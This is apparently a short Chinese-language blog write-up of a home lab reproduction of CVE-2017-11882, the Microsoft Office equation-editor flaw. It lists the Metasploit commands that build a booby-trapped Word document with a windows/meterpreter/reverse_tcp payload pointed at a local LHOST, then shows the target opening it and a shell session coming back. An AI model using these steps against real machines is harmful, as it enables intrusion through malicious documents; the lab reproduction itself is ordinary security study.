好久没实践攻防的技术了，本周开始回归，而且直接来个重量级的，CVE-2017-11882，

有人说这不是两年前的么，还有啥意思，

有啥意思，你看就完了，这么牛X的漏洞两年多了还没爆发，我都奇了怪了，

我参考的是https://github.com/0x09AL/CVE-2017-11882-metasploit，

先安装一个Win7 SP1 X64 + Office2013的靶机环境，够常见的吧，

再安装一个最新的metasploit，

把POC作者写的两个文件拷贝到metasploit环境里，

sudo vim /opt/metasploit-framework/embedded/framework/modules/exploits/windows/local/cve_2017_11882.rb，

sudo vim /opt/metasploit-framework/embedded/framework/data/exploits/cve-2017-11882.rtf

接着就是一顿操作猛如虎，一斤炒成一斤五，

use exploit/windows/local/cve_2017_11882
set FILENAME test.doc
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.137.45
show options

执行，exploit，

把生成的word文件整出来，再整到靶机环境里并打开，

metasploit这边就能看到meterpreter shell过来了，

这里POC作者处理的不太友好，

需要自己通过sessions -l和sessions -i 1命令进会话，

先看看靶机系统信息，

再看看靶机地址信息，

后面还能干啥，自己寻思去吧，
